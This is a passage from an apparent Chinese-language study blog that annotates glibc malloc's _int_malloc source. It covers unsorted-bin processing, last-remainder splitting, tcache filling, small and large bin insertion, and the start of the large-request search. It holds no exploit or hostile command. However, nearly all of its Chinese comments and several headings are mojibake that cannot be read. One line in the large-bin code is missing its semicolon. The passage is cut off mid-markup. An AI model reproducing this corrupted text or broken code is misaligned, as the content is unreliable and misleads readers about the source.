class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*     Process recently freed or remaindered chunks, taking one only if     </span><br><span class="hljs-comment">    it is exact fit, or, if this a small request, the chunk is remainder from     </span><br><span class="hljs-comment">    the most recent non-exact fit.  Place other traversed chunks in     </span><br><span class="hljs-comment">    bins.  Note that this step is the only place in any routine where     </span><br><span class="hljs-comment">    chunks are placed in bins.     </span><br><span class="hljs-comment">    The outer loop here is needed because we might not realize until     </span><br><span class="hljs-comment">    near the end of malloc that we should have consolidated, so must     </span><br><span class="hljs-comment">    do so and retry. This happens at most once, and only when we would     </span><br><span class="hljs-comment">    otherwise need to expand memory to service a &quot;small&quot; request.   */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>INTERNAL_SIZE_T tcache_nb = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">size_t</span> tc_idx = csize2tidx(nb);<br><span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>    tcache_nb = nb;<br><span class="hljs-keyword">int</span> return_cached = <span class="hljs-number">0</span>;<br>tcache_unsorted_count = <span class="hljs-number">0</span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><span class="hljs-keyword">for</span> (;;)<br>&#123;<br>    <span class="hljs-keyword">int</span> iters = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> ((victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av)) <span class="hljs-comment">// å–å‡ºé“¾è¡¨æœ€åä¸€ä¸ª, FIFO</span><br>    &#123;<br>        bck = victim-&gt;bk; <span class="hljs-comment">//å€’æ•°ç¬¬äºŒä¸ª</span><br>        <span class="hljs-comment">//victimè¿‡å¤§æˆ–è¿‡å°éƒ½ä¼šå‡ºé”™</span><br>        <span class="hljs-keyword">if</span> (__builtin_expect(chunksize_nomask(victim) &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>) ||                      __builtin_expect(chunksize_nomask(victim) &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>            malloc_printerr(check_action, <span class="hljs-string">&quot;malloc(): memory corruption&quot;</span>, chunk2mem(victim), av);<br>        size = chunksize(victim);<br></code></pre></div></td></tr></table></figure><h4 id="if-small-try-last-remainder"><a href="#if-small-try-last-remainder" class="headerlink" title="if small try last remainder"></a>if small try last remainder</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">      <span class="hljs-comment">/*</span><br><span class="hljs-comment">           If a small request, try to use last remainder if it is the</span><br><span class="hljs-comment">           only chunk in unsorted bin.  This helps promote locality for</span><br><span class="hljs-comment">           runs of consecutive small requests. This is the only</span><br><span class="hljs-comment">           exception to best-fit, and applies only when there is</span><br><span class="hljs-comment">           no exact fit for a small chunk.</span><br><span class="hljs-comment">         */</span><br><span class="hljs-comment">// å¦‚æœå½“å‰è¯·æ±‚ä½äºsmall chunksçš„å¤§å°èŒƒå›´å†…</span><br>    <span class="hljs-comment">// åŒæ—¶ï¼Œunsorted biné‡Œåªæœ‰ä¸€ä¸ªchunkï¼Œè¯¥chunkè¿˜æ˜¯last_remainder</span><br>    <span class="hljs-comment">// å¹¶ä¸” last remainder çš„å¤§å°åˆ†å‰²åè¿˜å¯ä»¥ä½œä¸ºä¸€ä¸ª chunk</span><br>      <span class="hljs-keyword">if</span> (in_smallbin_range(nb) &amp;&amp; <br>          bck == unsorted_chunks(av) &amp;&amp; <br>          victim == av-&gt;last_remainder &amp;&amp; <br>          (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(size) &gt; (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(nb + MINSIZE)) <span class="hljs-comment">//victimåˆ†å‰²å‡ºnbåè¿˜æœ‰MINSIZE</span><br>      &#123;<br>          <span class="hljs-comment">/* split and reattach remainder */</span><br>          remainder_size = size - nb;<br>          <span class="hljs-comment">//åˆ†å‰²åå‰©ä¸‹çš„chunkæŒ‡é’ˆ</span><br>          remainder = chunk_at_offset(victim, nb);<br>          <span class="hljs-comment">//è®¾ç½®ä»unsorted binä¸­å‰²å‡ºæ¥çš„chunkçš„fdå’Œbk</span><br>          unsorted_chunks(av)-&gt;bk = unsorted_chunks(av)-&gt;fd = remainder;<br>          <span class="hljs-comment">//æ›´æ–°last_remainer</span><br>          av-&gt;last_remainder = remainder;<br>          <span class="hljs-comment">//è®¾ç½®å‰©ä¸‹çš„chunkçš„fdå’Œbk</span><br>          remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks(av);<br>          <span class="hljs-keyword">if</span> (!in_smallbin_range(remainder_size))<br>          &#123;<span class="hljs-comment">//å¦‚æœæ˜¯largechunk, ä¹Ÿè®¾ç½®ä¸€ä¸‹nextsize</span><br>              remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>              remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>          &#125;<br>          <span class="hljs-comment">//è®¾ç½®ä¸¤ä¸ªå—çš„æ ‡è®°bit</span><br>          set_head(victim, nb | PREV_INUSE |<br>                               (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>          set_head(remainder, remainder_size | PREV_INUSE);<br>          set_foot(remainder, remainder_size);<br>          <span class="hljs-comment">//è¯¦ç»†çš„æ£€æŸ¥, åªæœ‰åœ¨MALLOC_DEBUGä¸º1æ—¶å¯ç”¨</span><br>          check_malloced_chunk(av, victim, nb);<br>          <span class="hljs-comment">//è¿”å›ç”¨æˆ·æŒ‡é’ˆ</span><br>          <span class="hljs-keyword">void</span> *p = chunk2mem(victim);<br>          alloc_perturb(p, bytes);<br>          <span class="hljs-keyword">return</span> p;<br>      &#125;<br></code></pre></div></td></tr></table></figure><h4 id="else-å–å‡ºvictim-å‡†å¤‡æ”¾å…¥åˆé€‚çš„binä¸­"><a href="#else-å–å‡ºvictim-å‡†å¤‡æ”¾å…¥åˆé€‚çš„binä¸­" class="headerlink" title="else å–å‡ºvictim, å‡†å¤‡æ”¾å…¥åˆé€‚çš„binä¸­"></a>else å–å‡ºvictim, å‡†å¤‡æ”¾å…¥åˆé€‚çš„binä¸­</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//å¦‚æœä¸æ»¡è¶³ä¸Šé¢çš„æ¡ä»¶, å°±å¾€ä¸‹æ‰§è¡Œ        </span><br><span class="hljs-comment">/* remove from unsorted list */</span> <br><span class="hljs-comment">//å–å‡ºäº†victim        </span><br><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)) <span class="hljs-comment">//2.28ç‰¹ä¾›</span><br>          malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);<br>unsorted_chunks(av)-&gt;bk = bck;        <br>bck-&gt;fd = unsorted_chunks(av);<br></code></pre></div></td></tr></table></figure><h4 id="if-exact-fit-tcache-or-return"><a href="#if-exact-fit-tcache-or-return" class="headerlink" title="if exact fit, tcache or return"></a>if exact fit, tcache or return</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">        <span class="hljs-comment">/* Take now instead of binning if exact fit */</span> <span class="hljs-comment">//å¦‚æœæœ‰åˆšå¥½çš„chunk, å–å‡ºå¹¶è¿”å›.</span><br>        <span class="hljs-keyword">if</span> (size == nb)<br>        &#123;<br>            set_inuse_bit_at_offset(victim, size);<br>            <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                set_non_main_arena(victim);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE <span class="hljs-comment">//ç”¨tcacheå°±æ”¾åˆ°é‡Œé¢ä¸è¿”å›. åœ¨å¾ªç¯ç»“æŸä¹‹åå–å‡ºè¿”å›. è®¾ç½®äº†return_cachedä¸º1. </span></span><br>            <span class="hljs-comment">/* Fill cache first, return to user only if cache fills. </span><br><span class="hljs-comment">            We may return one of these chunks later.  */</span> <br>            <span class="hljs-keyword">if</span> (tcache_nb &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)<br>            &#123;<br>                tcache_put(victim, tc_idx);<br>                return_cached = <span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span>     <span class="hljs-comment">//è¯¦ç»†çš„æ£€æŸ¥, åªæœ‰åœ¨MALLOC_DEBUGä¸º1æ—¶å¯ç”¨</span></span><br>                check_malloced_chunk(av, victim, nb);<br>                <span class="hljs-keyword">void</span> *p = chunk2mem(victim);<br>                alloc_perturb(p, bytes);<br>                <span class="hljs-keyword">return</span> p;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>            &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>        &#125;<br></code></pre></div></td></tr></table></figure><h4 id="æ”¾å…¥small-or-large-bin"><a href="#æ”¾å…¥small-or-large-bin" class="headerlink" title="æ”¾å…¥small or large bin"></a>æ”¾å…¥small or large bin</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">       <span class="hljs-comment">/* place chunk in bin */</span><br><span class="hljs-comment">//è¿™ä¸€æ­¥æ„å‘³ç€æ²¡æœ‰åˆšå¥½åˆé€‚çš„chunk, æ‰€ä»¥æ”¾å…¥åˆ°ç›¸åº”çš„binä¸­</span><br>       <span class="hljs-keyword">if</span> (in_smallbin_range(size))<br>       &#123;<span class="hljs-comment">//å¦‚æœæ˜¯smallbin</span><br>           victim_index = smallbin_index(size);<br>           bck = bin_at(av, victim_index);<span class="hljs-comment">//binæ•°ç»„é‡Œçš„chunkæŒ‡é’ˆ</span><br>           fwd = bck-&gt;fd;<span class="hljs-comment">//smallbiné“¾è¡¨é‡Œçš„ç¬¬ä¸€ä¸ªchunk</span><br>       &#125;<br>       <span class="hljs-keyword">else</span><br>       &#123;<span class="hljs-comment">//å¦‚æœä¸æ˜¯smallçš„è¯å°±æ˜¯largebinäº†</span><br>           victim_index = largebin_index(size);<br>           bck = bin_at(av, victim_index);<br>           fwd = bck-&gt;fd;<br><br>           <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>           <span class="hljs-comment">//largebinæ˜¯æœ‰é¡ºåºçš„(ä»å·¦å¾€å³,ç”±å¤§è‡³å°), è¦æ”¾åœ¨åˆé€‚çš„ä½ç½®, è¿˜è¦è®¾ç½®fd_nextsizeç­‰ç­‰</span><br>           <span class="hljs-keyword">if</span> (fwd != bck)<br>           &#123;<span class="hljs-comment">//å¦‚æœlargebinä¸ºéç©º</span><br>               <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>               size |= PREV_INUSE;<br>               <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>               <span class="hljs-comment">//å¦‚æœä¸æ˜¯åœ¨main_arenaå‘¢?çœ‹æ¥è¿˜æ˜¯å¾—å­¦ä¸€å­¦çº¿ç¨‹</span><br>               assert(chunk_main_arena(bck-&gt;bk));<br>               <span class="hljs-comment">//chunksize_nomask()ç›´æ¥å–å‡ºsizeæ®µ, ä¸ç”¨ä½è¿ç®—, æ‰€ä»¥è¯´speed comparison</span><br>               <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(size) &lt; (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)chunksize_nomask(bck-&gt;bk))<br>               &#123;<span class="hljs-comment">//victimçš„sizeå°äºlargebinå°¾éƒ¨(bck-&gt;bk)çš„æœ€å°chunk, æ”¾åˆ°æœ€å³è¾¹</span><br>                  <span class="hljs-comment">// ä»¤ fwd æŒ‡å‘ large bin å¤´</span><br>                   fwd = bck;<br>                   <span class="hljs-comment">// ä»¤ bck æŒ‡å‘ largin bin å°¾éƒ¨ chunk</span><br>                   bck = bck-&gt;bk;<br>                   <span class="hljs-comment">// victim çš„ fd_nextsize æŒ‡å‘ largin bin çš„ç¬¬ä¸€ä¸ª chunk</span><br>                   victim-&gt;fd_nextsize = fwd-&gt;fd;<br>                   <span class="hljs-comment">// victim çš„ bk_nextsize æŒ‡å‘åŸæ¥é“¾è¡¨çš„ç¬¬ä¸€ä¸ª chunk æŒ‡å‘çš„ bk_nextsize</span><br>                   <span class="hljs-comment">//åŸæ¥é“¾è¡¨çš„ç¬¬ä¸€ä¸ª chunk æŒ‡å‘çš„ bk_nextsizeæ˜¯åŸæ¥æœ€å°çš„(chunk A),</span><br>                   <span class="hljs-comment">//å› ä¸ºè¿™æ—¶victimæ¯”Aå°, æ‰€ä»¥victimçš„bk_nextsizeè‚¯å®šæ˜¯A</span><br>                   victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>                   <span class="hljs-comment">// åŸæ¥é“¾è¡¨çš„ç¬¬ä¸€ä¸ª chunk çš„ bk_nextsize æŒ‡å‘ victim</span><br>                   <span class="hljs-comment">// åŸæ¥æŒ‡å‘é“¾è¡¨ç¬¬ä¸€ä¸ª chunk çš„ fd_nextsize æŒ‡å‘ victim</span><br>                   fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim<br>               &#125;<br>               <span class="hljs-keyword">else</span><br>               &#123;<br>                       <span class="hljs-comment">// å½“å‰è¦æ’å…¥çš„ victim çš„å¤§å°å¤§äºæœ€å°çš„ chunk, ä»å·¦å¾€å³æŸ¥æ‰¾åˆé€‚ä½ç½®.</span><br>                       <span class="hljs-comment">// åˆ¤æ–­ fwd æ˜¯å¦åœ¨ main arena</span><br>                       assert(chunk_main_arena(fwd));<br><span class="hljs-comment">// ä»é“¾è¡¨å¤´éƒ¨å¼€å§‹æ‰¾åˆ°ä¸æ¯” victim å¤§çš„ chunk</span><br>                       <span class="hljs-keyword">while</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) size &lt; chunksize_nomask(fwd)) &#123;<br>                           fwd = fwd-&gt;fd_nextsize;<br>                           assert(chunk_main_arena(fwd));<br>                       &#125;<br>                       <span class="hljs-comment">// å¦‚æœæ‰¾åˆ°äº†ä¸€ä¸ªå’Œ victim ä¸€æ ·å¤§çš„ chunkï¼Œ</span><br>                       <span class="hljs-comment">// é‚£å°±ç›´æ¥å°† chunk æ’å…¥åˆ°è¯¥chunkçš„åé¢ï¼Œå¹¶ä¸ä¿®æ”¹ nextsize æŒ‡é’ˆã€‚</span><br>                       <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) size ==<br>                           (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) chunksize_nomask(fwd))<br>                           <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                           fwd = fwd-&gt;fd;<br>                       <span class="hljs-keyword">else</span> &#123;<br>                           <span class="hljs-comment">// å¦‚æœæ‰¾åˆ°çš„chunkå’Œå½“å‰victimå¤§å°ä¸ä¸€æ ·</span><br> <span class="hljs-comment">// å°±éœ€è¦æ„é€  nextsize åŒå‘é“¾è¡¨,victimæ’å…¥åˆ°fwdå’Œå·¦è¾¹ä¸€ä¸ªchunkä¹‹é—´</span><br>                           victim-&gt;fd_nextsize              = fwd;<br>                           victim-&gt;bk_nextsize              = fwd-&gt;bk_nextsize;<br>                           fwd-&gt;bk_nextsize                 = victim;<br>                           victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                       &#125;<br>                       bck = fwd-&gt;bk;<br>               &#125;<br>           &#125;<br>           <span class="hljs-keyword">else</span> <span class="hljs-comment">//å¦‚æœlargebinæ˜¯ç©ºçš„,fd_nextå’Œbk_nextéƒ½æŒ‡å‘è‡ªå·±å°±å¯ä»¥äº†</span><br>               victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>       &#125;<br>   <span class="hljs-comment">//å®Œæˆvictimçš„fdå’ŒbkæŒ‡é’ˆçš„ä¿®æ”¹, å½¢æˆbck--&gt;victim--&gt;fwd</span><br>       mark_bin(av, victim_index);<br>       victim-&gt;bk = bck;<br>       victim-&gt;fd = fwd;<span class="hljs-comment">//ä»¥ä¸Šä¸¤è¡Œå°†victimæ’å…¥åˆ°ç›¸åº”çš„é“¾è¡¨å¤´éƒ¨ä¸­</span><br>       fwd-&gt;bk = victim;<br>       bck-&gt;fd = victim;<span class="hljs-comment">//ä¿®æ”¹bckçš„fdæŒ‡å‘victim, fwd(å³ç°åœ¨çš„ç¬¬äºŒä¸ªchunk)çš„bkæŒ‡å‘victim</span><br></code></pre></div></td></tr></table></figure><h4 id="åˆ¤æ–­iters-å¤§å¾ªç¯ç»“å°¾"><a href="#åˆ¤æ–­iters-å¤§å¾ªç¯ç»“å°¾" class="headerlink" title="åˆ¤æ–­iters(å¤§å¾ªç¯ç»“å°¾)"></a>åˆ¤æ–­iters(å¤§å¾ªç¯ç»“å°¾)</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>        <span class="hljs-comment">/* If we&#x27;ve processed as many chunks as we&#x27;re allowed while</span><br><span class="hljs-comment"> filling the cache, return one of the cached ones.  */</span><br>        ++tcache_unsorted_count;<br>        <span class="hljs-keyword">if</span> (return_cached &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="hljs-number">0</span> &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)<br>        &#123;<br>            <span class="hljs-keyword">return</span> tcache_get(tc_idx);<br>        &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX_ITERS 10000</span><br>        <span class="hljs-keyword">if</span> (++iters &gt;= MAX_ITERS)<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<span class="hljs-comment">//unsortedå¤§å¾ªç¯ç»“æŸ, é¿å…èŠ±è´¹è¿‡å¤šæ—¶é—´åœ¨unsortedbinçš„å¤„ç†ä¸Š</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>    <span class="hljs-comment">/* If all the small chunks we found ended up cached, return one now.  */</span><br>    <span class="hljs-keyword">if</span> (return_cached)<br>    &#123;<br>        <span class="hljs-keyword">return</span> tcache_get(tc_idx);<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br></code></pre></div></td></tr></table></figure><h3 id="large-request"><a href="#large-request" class="headerlink" title="large request"></a><u>large request</u></h3><p>å€¼å¾—æ³¨æ„çš„æ˜¯ä½¿ç”¨åå‘éå†. </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">   <span class="hljs-comment">/*</span><br><span class="hljs-comment">        If a large request, scan through the chunks of current bin in</span><br><span class="hljs-comment">        sorted order to find smallest that fits.  Use the skip list for this.</span><br><span class="hljs-comment">      */</span><br><span class="hljs-comment">//å›æƒ³ä¸€ä¸‹, å¾ªç¯ä¹‹å‰åˆ¤æ–­äº†fastbinå’Œsmallbin, åˆ°largebinçš„æ—¶å€™å…ˆmalloc_consolidateæ¸…ç†fastbinåˆ°unsortedbin,</span><br><span class="hljs-comment">//ä»unsortedbinä¸­ä¸€ä¸ªä¸ªå–å‡º,å†ç»last_remainer,exact fitå’Œæ”¾å…¥ç›¸åº”binä¸­å, å¾ªç¯ä¸­åªåˆ¤æ–­äº†ä»unsortedbinä¸­å–å‡ºçš„å—</span><br><span class="hljs-comment">//å³åˆå¹¶ä¹‹åçš„chunk,å¹¶ä¸”æ²¡æœ‰ä¸€å—å’Œnbç›¸ç­‰.ç”±äºsmallbinæ¯ä¸ªbinä¸­chunkå¤§å°ä¸€è‡´,ä¹Ÿå°±æ˜¯è¯´ä¸¤æ¬¡æ¯”è¾ƒsmallbinä¸­éƒ½æ²¡æœ‰åˆé€‚çš„chunk,</span><br><span class="hljs-comment">//è·³å‡ºå¾ªç¯ä¹‹åç›´æ¥æ‰¾ *largechunk* é‡Œçš„å³å¯, å¹¶ä¸”æ˜¯find smallest that fits, ä¸ä¸€å®šè¦åˆšåˆšå¥½</span><br>   <span class="hljs-keyword">if</span> (!in_smallbin_range(nb))<br>   &#123;<br>       bin = bin_at(av, idx); <span class="hljs-comment">//idxæ˜¯nbå®šä½å‡ºæ¥çš„idx,åœ¨å¤§å¾ªç¯ä¹‹å‰,åˆ°è¿™é‡Œè¯´æ˜æ˜¯largebin_idx</span><br><br>       <span class="hljs-comment">/* skip scan if empty or largest chunk is too small */</span><br>       <span class="hljs-keyword">if</span> ((victim = first(bin)) != bin &amp;&amp; (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)chunksize_nomask(victim) &gt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(nb))<br>       &#123;<span class="hljs-comment">//å¦‚æœè¯¥largebinéç©º ä¸” æœ€å¤§çš„ä¸å°äºnb</span><br>           <span class="hljs-comment">//ä¸ºäº†åå‘éå†,victimæŒ‡å‘æœ€åä¸€ä¸ªæœ€å°çš„largechunk</span><br>           victim = victim-&gt;bk_nextsize;<br>           <span class="hljs-comment">//æ‰¾å‡ºç¬¬ä¸€ä¸ªä¸å°äºnbçš„å—, å¹¶ä¸”èµ‹å€¼sizeä¸ºè¿™ä¸ªchunkçš„å¤§å°</span><br>           <span class="hljs-comment">//å¦‚æœæœ‰å¤šä¸ªç›¸åŒå¤§å°çš„chunk, victimä¼šå®šä½åˆ°ç¬¬ä¸€ä¸ªæœ‰fd_nextsizeæŒ‡é’ˆçš„chunk</span><br>           <span class="hljs-keyword">while</span> (((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(size = chunksize(victim)) &lt;(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(nb)))<br>               victim = victim-&gt;bk_nextsize;<br><br>           <span class="hljs-comment">//å¦‚æœä»largebiné“¾è¡¨ä¸­é€‰å–çš„victimä¸æ˜¯é“¾è¡¨ä¸­çš„æœ€åä¸€ä¸ªchunk,å¹¶ä¸”ä¸victimå¤§å°ç›¸åŒçš„chunkä¸æ­¢ä¸€ä¸ª</span><br>           <span class="hljs-comment">//æ„å‘³ç€victimä¸ºchunk sizeé“¾è¡¨ä¸­çš„èŠ‚ç‚¹</span><br>           <span class="hljs-comment">//ä¸ºäº†é¿å…è°ƒæ•´chunksizeé“¾è¡¨, å°†victimçš„fdä½œä¸ºå€™é€‰chunk</span><br>           <span class="hljs-keyword">if</span> (victim != last(bin) &amp;&amp; chunksize_nomask(victim) == chunksize_nomask(victim-&gt;fd))<br>               victim = victim-&gt;fd;<br>           <br>   <span class="hljs-comment">//å‡†å¤‡åˆ†å‰²,unlinkå–å‡ºvictim</span><br>           remainder_size = size - nb;<br>           unlink(av, victim, bck, fwd);<br><br>           <span class="hljs-comment">/* Exhaust */</span><br>           <span class="hljs-keyword">if</span> (remainder_size &lt; MINSIZE)<br>           &#123;<span 